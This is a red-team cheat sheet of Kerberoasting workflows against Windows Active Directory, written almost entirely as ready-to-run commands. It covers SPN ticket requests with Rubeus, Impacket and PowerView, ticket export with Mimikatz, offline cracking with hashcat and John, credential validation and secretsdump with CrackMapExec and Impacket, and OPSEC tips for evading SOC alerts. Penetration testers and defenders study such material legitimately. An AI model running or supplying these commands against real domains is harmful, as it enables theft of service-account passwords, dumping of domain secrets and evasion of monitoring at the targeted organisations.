# Kerberoasting Attack Workflows

## Workflow 1: Kerberoasting with Rubeus (Windows)

### Step 1: Enumerate Kerberoastable Accounts
```powershell
# List all Kerberoastable users
.\Rubeus.exe kerberoast /stats

# Full Kerberoasting - request all SPN tickets
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Target specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_hash.txt

# Request RC4 encrypted tickets specifically
.\Rubeus.exe kerberoast /rc4opsec /outfile:rc4_hashes.txt

# Request AES tickets
.\Rubeus.exe kerberoast /aes /outfile:aes_hashes.txt

# Kerberoast from a different domain
.\Rubeus.exe kerberoast /domain:child.targetdomain.local /outfile:child_hashes.txt
```

### Step 2: Targeted Kerberoasting (set SPN on account with GenericWrite)
```powershell
# If you have GenericWrite/GenericAll on an account, set an SPN
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='nonexistent/SERVICE'}

# Request TGS for the newly set SPN
.\Rubeus.exe kerberoast /user:targetuser /outfile:targeted_hash.txt

# Clean up - remove the SPN
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

## Workflow 2: Kerberoasting with Impacket (Linux)

### Step 1: Remote Kerberoasting
```bash
# Basic Kerberoasting with password
impacket-GetUserSPNs targetdomain.local/user:Password123 -dc-ip 10.0.0.1 -request -outputfile kerberoast.txt

# With NTLM hash (pass-the-hash)
impacket-GetUserSPNs targetdomain.local/user -hashes :aad3b435b51404eeaad3b435b51404ee:NTHASH -dc-ip 10.0.0.1 -request

# Target specific user
impacket-GetUserSPNs targetdomain.local/user:Password123 -dc-ip 10.0.0.1 -request -outputfile kerberoast.txt -target-domain targetdomain.local

# Enumerate without requesting tickets
impacket-GetUserSPNs targetdomain.local/user:Password123 -dc-ip 10.0.0.1
```

## Workflow 3: Kerberoasting with PowerView (PowerShell)

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find all users with SPNs
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, admincount

# Get detailed SPN information
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,lastlogon,admincount

# Request TGS tickets using built-in cmdlet
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.local:1433"

# Export ticket from memory using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

## Workflow 4: Offline Password Cracking

### Hashcat
```bash
# RC4 encrypted tickets (etype 23) - Hashcat mode 13100
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# AES-128 tickets (etype 17) - Hashcat mode 19700
hashcat -m 19700 aes_hashes.txt /usr/share/wordlists/rockyou.txt

# AES-256 tickets (etype 18) - Hashcat mode 19800
hashcat -m 19800 aes_hashes.txt /usr/share/wordlists/rockyou.txt

# Using custom rules for corporate passwords
hashcat -m 13100 kerberoast.txt wordlist.txt -r corporate.rule

# Brute force with mask (e.g., Summer2024!)
hashcat -m 13100 kerberoast.txt -a 3 '?u?l?l?l?l?l?d?d?d?d?s'

# Combined dictionary + rules
hashcat -m 13100 kerberoast.txt wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule -r /usr/share/hashcat/rules/toggles1.rule
```

### John the Ripper
```bash
# Crack Kerberoast hashes
john --format=krb5tgs kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt

# With rules
john --format=krb5tgs kerberoast.txt --wordlist=wordlist.txt --rules=KoreLogicRulesAppend4Num
```

## Workflow 5: Post-Exploitation

### Credential Validation
```bash
# Validate cracked credentials with CrackMapExec
crackmapexec smb 10.0.0.0/24 -u svc_sql -p 'CrackedPassword123!'

# Check if account has admin rights anywhere
crackmapexec smb 10.0.0.0/24 -u svc_sql -p 'CrackedPassword123!' --shares

# Check DCSync rights
crackmapexec smb 10.0.0.1 -u svc_sql -p 'CrackedPassword123!' -M dcsync

# Use credentials for further enumeration
impacket-secretsdump targetdomain.local/svc_sql:'CrackedPassword123!'@10.0.0.1
```

## OPSEC Considerations

1. Request tickets for only a few accounts at a time to avoid detection
2. Prefer AES tickets over RC4 - RC4 requests may trigger alerts
3. Use /rc4opsec flag in Rubeus to avoid requesting RC4 for AES-enabled accounts
4. Spread requests over time rather than requesting all at once
5. Target accounts with older password change dates (more likely weak)
6. Monitor for honeypot SPNs that may alert the SOC
